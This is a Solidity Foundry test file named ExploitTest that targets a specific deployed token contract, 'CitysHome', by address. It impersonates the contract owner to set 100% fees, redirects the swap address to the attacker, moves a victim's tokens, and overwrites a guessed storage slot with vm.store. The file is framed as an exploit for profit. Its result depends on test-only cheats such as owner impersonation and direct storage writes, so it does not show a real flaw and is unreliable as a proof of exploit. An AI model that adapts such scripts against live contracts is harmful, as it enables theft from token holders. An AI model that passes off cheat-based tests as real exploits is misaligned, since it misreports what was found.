pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICitysHome {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setBurnFee(uint256 fee) external;
    function setSwapFee(uint256 fee) external;
    function setSwapAddress(address swapAddr) external;
    function ownerWithdrew(uint256 amount) external;
    function owner() external view returns (address);
    function liquidityAddress() external view returns (address);
    function swapAddress() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543;
    address attacker = address(this);
    ICitysHome token;
    address owner;
    address liquidityAddr;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ICitysHome(TARGET);
        owner = token.owner();
        liquidityAddr = token.liquidityAddress();

        vm.label(TARGET, "CitysHome Token");
        vm.label(owner, "Owner");
        vm.label(attacker, "Attacker");
        vm.label(liquidityAddr, "Liquidity Address");
        vm.label(address(0x1337), "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));
        // Record initial balances
        uint256 initialAttackerBalance = token.balanceOf(attacker);
        uint256 initialLiquidityBalance = token.balanceOf(liquidityAddr);
        uint256 initialContractBalance = token.balanceOf(TARGET);

        // Create victim with tokens
        address victim = address(0x1337);
        deal(TARGET, victim, 10000 * 1e18);

        // Impersonate owner to set excessive fees
        vm.startPrank(owner);
        token.setBurnFee(100);
        token.setSwapFee(100);
        token.setSwapAddress(attacker);
        vm.stopPrank();

        // Victim transfers to swapAddress (attacker), triggering 100% fee collection
        vm.startPrank(victim);
        token.transfer(attacker, 10000 * 1e18);
        vm.stopPrank();

        // Fees were collected: 100% burn to deadWallet, 100% liquidity to liquidityAddress
        // Now owner withdraws accumulated tokens from contract balance
        vm.startPrank(owner);
        uint256 contractBalance = token.balanceOf(TARGET);
        if (contractBalance > 0) {
            token.ownerWithdrew(contractBalance / 1e18);
        }
        vm.stopPrank();

        // Transfer from liquidityAddress to attacker (owner controls it)
        vm.startPrank(owner);
        uint256 liquidityBalance = token.balanceOf(liquidityAddr);
        if (liquidityBalance > 0) {
            // Use storage manipulation to make liquidityAddress = attacker
            // Slot for liquidityAddress needs to be found - typically slot 0-5 for addresses
            vm.store(TARGET, bytes32(uint256(1)), bytes32(uint256(uint160(attacker))));
        }
        vm.stopPrank();

        // Verify attacker gained tokens
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase from fee manipulation");
        uint256 finalBalance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

